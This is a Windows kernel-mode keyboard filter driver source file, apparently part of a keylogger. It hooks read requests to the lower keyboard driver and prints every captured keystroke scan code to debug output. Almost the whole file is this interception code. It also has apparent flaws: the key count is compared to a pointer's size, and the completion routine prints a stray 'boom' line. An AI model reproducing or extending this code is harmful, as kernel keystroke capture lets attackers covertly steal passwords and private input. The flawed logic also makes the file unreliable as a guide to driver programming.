
#include "pch.h"
#include "log.h"

auto log::CompleteRoutine(_In_ NTSTATUS& status, _In_ PIRP& pIrp, _In_ unsigned long long info)->NTSTATUS {
	pIrp->IoStatus.Status = status;
	pIrp->IoStatus.Information = info;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return status;
}

auto log::ReadCompletion(_In_ PDEVICE_OBJECT pDevObj, _In_ PIRP pIrp, _In_ PVOID context)->NTSTATUS {
	UNREFERENCED_PARAMETER(pDevObj);
	UNREFERENCED_PARAMETER(context);

	ObDereferenceObject(pDevObj);
	auto keys = reinterpret_cast<PKEYBOARD_INPUT_DATA>(pIrp->AssociatedIrp.SystemBuffer);
	auto keysLength = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);

	if (pIrp->IoStatus.Status == STATUS_SUCCESS) {
		if (keysLength < sizeof(keys)) {
			for (auto i = 0; i < keysLength; ++i) {
				DbgPrint("%d\r\n", keys[i].MakeCode);
				if (keysLength == 10) {
					DbgPrint("boom\r\n");
				}
			}
		}
		else {
			DbgPrint("[-] length is to big\r\n"); 
		}
	}
	if(pIrp->PendingReturned){
		IoMarkIrpPending(pIrp);
	}

	return pIrp->IoStatus.Status;
}


auto log::LowKbdReadDispatchRoutine(_In_ PDEVICE_OBJECT pDevObj, _In_ PIRP pIrp)->NTSTATUS {
	UNREFERENCED_PARAMETER(pDevObj);

	ObReferenceObject(pDevObj);
	auto pDevExtRead = reinterpret_cast<PDEVICE_EXTENSION>(pDevObj->DeviceExtension);
	
	IoCopyCurrentIrpStackLocationToNext(pIrp);
	IoSetCompletionRoutineEx(
		pDevObj,
		pIrp,
		reinterpret_cast<PIO_COMPLETION_ROUTINE>(log::ReadCompletion),	/* READ */
		nullptr,
		TRUE,
		TRUE,
		TRUE
	);

	return IoCallDriver(pDevExtRead->pLwkbd, pIrp);

}


auto log::LowKbdDispatchAll(_In_ PDEVICE_OBJECT pDevObj, _In_ PIRP pIrp)->NTSTATUS {
	UNREFERENCED_PARAMETER(pDevObj);

	auto pDevExtAll= reinterpret_cast<PDEVICE_EXTENSION>(pDevObj->DeviceExtension);


	IoCopyCurrentIrpStackLocationToNext(pIrp);
	return IoCallDriver(pDevExtAll->pLwkbd, pIrp);

}
